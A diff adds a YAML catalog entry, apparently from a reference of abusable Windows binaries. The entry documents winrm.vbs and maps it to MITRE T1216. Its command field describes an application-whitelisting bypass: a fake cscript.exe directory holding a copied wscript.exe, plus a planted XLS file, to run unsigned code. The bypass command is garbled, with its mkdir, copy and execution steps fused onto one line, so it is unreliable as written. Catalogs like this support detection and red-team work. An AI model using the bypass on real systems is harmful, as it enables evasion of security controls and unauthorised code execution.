@@ -1,0 +1,46 @@
+---
+Name: 'Winrm.vbs'
+Description: ''
+Created: '2018-07-31'
+Commands:
+  - Command: 'winrm quickconfig'
+    Description: 'Execute winrm - requires registry changes to activate COM object'
+  - Command: 'mkdir %SystemDrive%\BypassDir\cscript.exe copy %windir%\System32\wscript.exe %SystemDrive%\BypassDir\cscript.exe\winword.exe %SystemDrive%\BypassDir\cscript.exe\winword.exe //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty'
+    Description: 'Creates Cscript.exe as dir to bypass winrm validation that cscript is running. Requires that a xls file is planted.'
+Windows Binary: true
+Bypasses Default AppLocker Rules: false
+Notes: 'XLS bypass may be fixed in V.Next of Windows.'
+MITRE:
+  - ID: 'T1216'
+    Link: 'https://attack.mitre.org/wiki/Technique/T1216'
+Atomic Red Teaming:
+  - Description: ''
+    Code: ''
+Full path:
+  - Path: 'C:\Windows\System32\winrm.vbs'
+  - Path: 'C:\Windows\SysWOW64\winrm.vbs'
+Verified on OS:
+  - Windows 10 1803: false
+  - Windows 10 1709: false
+  - Windows 10 1703: false
+  - Windows 10 1607: false
+  - Windows 10 1511: false
+  - Windows 10 1507: false
+  - Windows 8.1: false
+  - Windows 8: false
+  - Windows 7: false
+Resources:
+  - Link: 'https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404'
+  - Link: 'https://www.youtube.com/watch?v=3gz1QmiMhss'
+  - Link: 'https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology'
+Acknowledgement:
+  - Name: 'Matt Graeber'
+    TwitterHandle: '@mattifestation'
+    Blog: 'http://www.exploit-monday.com/'
+  - Name: 'Matt Nelson'
+    TwitterHandle: '@enigma0x3'
+    Blog: 'https://enigma0x3.net'
+  - Name: 'Casey Smith'
+    TwitterHandle: '@subtee'
+    Blog: 'http://subt0x11.blogspot.com/'
+---
